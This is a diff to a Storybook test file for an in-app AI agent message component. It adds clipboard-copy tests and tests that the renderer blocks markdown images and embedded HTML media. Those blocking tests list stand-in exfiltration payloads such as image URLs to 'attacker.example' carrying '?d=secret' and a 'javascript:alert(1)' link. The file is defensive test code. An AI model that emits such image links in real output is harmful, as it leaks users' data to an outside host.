@@ -1,5 +1,5 @@
 import preview from "../../../../.storybook/preview";
-import { expect, fn, userEvent, waitFor, within } from "storybook/test";
+import { expect, fn, spyOn, userEvent, waitFor, within } from "storybook/test";
 import { InAppAgentMessage } from "./InAppAgentMessage";
 
 const meta = preview.meta({
@@ -343,6 +343,63 @@ export const CopyMarkdownSelectionInteraction = meta.story({
   },
 });
 
+export const BlockedMarkdownImages = meta.story({
+  name: "(Test) Blocked Markdown Images",
+  args: {
+    role: "assistant",
+    isFinalAnswer: false,
+    content: {
+      type: "text",
+      text: [
+        "Summary.",
+        ...[
+          "https://attacker.example/p.png?d=secret",
+          "//attacker.example/p.png",
+          `${window.location.origin}/image.png`,
+          "/image.png",
+          "https://media.example/bucket/media/image.png?signature=test",
+          "data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=",
+          "data:image/png;base64,not-valid-base64",
+          "javascript:alert(1)",
+        ].map((url) => `![status](${url})`),
+      ].join("\n\n"),
+    },
+  },
+  play: async ({ canvasElement }) => {
+    await within(canvasElement).findByText("Summary.");
+    await expect(canvasElement.querySelector("img")).toBeNull();
+  },
+});
+
+export const BlockedEmbeddedMedia = meta.story({
+  name: "(Test) Blocked Embedded Media",
+  args: {
+    role: "assistant",
+    isFinalAnswer: false,
+    content: {
+      type: "text",
+      text: `Summary.
+
+<img src="https://attacker.example/p.png?d=secret" alt="status">
+<picture><source srcset="https://attacker.example/source.png"><img src="/image.png"></picture>
+<iframe src="https://attacker.example/frame"></iframe>
+<video poster="https://attacker.example/poster.png" src="https://attacker.example/video"></video>
+<audio src="https://attacker.example/audio"></audio>
+<object data="https://attacker.example/object"></object>
+<embed src="https://attacker.example/embed">
+<svg><image href="https://attacker.example/svg.png"></image></svg>`,
+    },
+  },
+  play: async ({ canvasElement }) => {
+    await within(canvasElement).findByText("Summary.");
+    await expect(
+      canvasElement.querySelector(
+        "img, source, iframe, video, audio, object, embed, svg image",
+      ),
+    ).toBeNull();
+  },
+});
+
 export const UserText = meta.story({
   args: {
     role: "user",
@@ -677,16 +734,23 @@ export const CopyMessageInteraction = meta.story({
   },
   play: async ({ canvasElement }) => {
     const canvas = within(canvasElement);
-    await userEvent.hover(canvasElement);
-    await userEvent.click(
-      await canvas.findByRole("button", { name: "Copy message" }),
-    );
+    const write = spyOn(navigator.clipboard, "write").mockResolvedValue();
 
-    await waitFor(() =>
-      expect(
-        canvas.getByRole("button", { name: "Message copied" }),
-      ).toBeVisible(),
-    );
+    try {
+      await userEvent.hover(canvasElement);
+      await userEvent.click(
+        await canvas.findByRole("button", { name: "Copy message" }),
+      );
+
+      await waitFor(() =>
+        expect(
+          canvas.getByRole("button", { name: "Message copied" }),
+        ).toBeVisible(),
+      );
+      expect(write).toHaveBeenCalledOnce();
+    } finally {
+      write.mockRestore();
+    }
   },
 });
 
@@ -709,5 +773,100 @@ export const UserTextWithoutActionsInteraction = meta.story({
     expect(
       canvas.queryByTestId("in-app-agent-message-actions"),
     ).not.toBeInTheDocument();
+  },
+});
+
+const tableAndCodeMessage = [
+  "Proposed metric",
+  "",
+  "| Priority | Status | Note |",
+  "| --- | --- | --- |",
+  '| 1 | New | say "hi", please |',
+  "| 2 | Open | a\\|b |",
+  "",
+  "```ts",
+  "const bottleneck = 'document-reranking';",
+  "```",
+].join("\n");
+
+export const TableAndCode = meta.story({
+  args: {
+    role: "assistant",
+    content: {
+      type: "text",
+      text: tableAndCodeMessage,
+    },
+    timestamp: storyTimestamp,
+    onSubmitFeedback: fn(),
+  },
+});
+
+export const CopyTableAndCodeInteraction = meta.story({
+  name: "(Test) Copy Table And Code",
+  args: {
+    role: "assistant",
+    content: {
+      type: "text",
+      text: tableAndCodeMessage,
+    },
+    timestamp: storyTimestamp,
+  },
+  play: async ({ canvasElement }) => {
+    const canvas = within(canvasElement);
+    const copy = spyOn(navigator.clipboard, "writeText").mockResolvedValue();
+    const csvButton = canvas.getByRole("button", { name: "Copy table as CSV" });
+    const markdownButton = canvas.getByRole("button", {
+      name: "Copy table as Markdown",
+    });
+    const codeButton = canvas.getByRole("button", { name: "Copy code" });
+    const table = canvas.getByRole("table");
+    const codeBlock = canvasElement.querySelector("pre");
+    if (!codeBlock) {
+      throw new Error("Missing code block");
+    }
+
+    try {
+      await expect(csvButton).not.toBeVisible();
+      await expect(markdownButton).not.toBeVisible();
+      await expect(codeButton).not.toBeVisible();
+
+      csvButton.click();
+      expect(copy).toHaveBeenLastCalledWith(
+        [
+          "Priority,Status,Note",
+          '1,New,"say ""hi"", please"',
+          "2,Open,a|b",
+        ].join("\n"),
+      );
+
+      markdownButton.click();
+      expect(copy).toHaveBeenLastCalledWith(
+        [
+          "| Priority | Status | Note |",
+          "| --- | --- | --- |",
+          '| 1 | New | say "hi", please |',
+          "| 2 | Open | a\\|b |",
+        ].join("\n"),
+      );
+
+      codeButton.click();
+      expect(copy).toHaveBeenLastCalledWith(
+        "const bottleneck = 'document-reranking';\n",
+      );
+
+      const block = table.parentElement?.parentElement;
+      if (!block) {
+        throw new Error("Missing table block");
+      }
+      const { clipboardData } = copySelectedNode(
+        block,
+        canvasElement.ownerDocument,
+      );
+      expect(clipboardData.getData("text/html")).not.toContain("button");
+      expect(clipboardData.getData("text/html")).not.toContain(".csv");
+      expect(clipboardData.getData("text/html")).not.toContain(".md");
+    } finally {
+      copy.mockRestore();
+    }
   },
 });
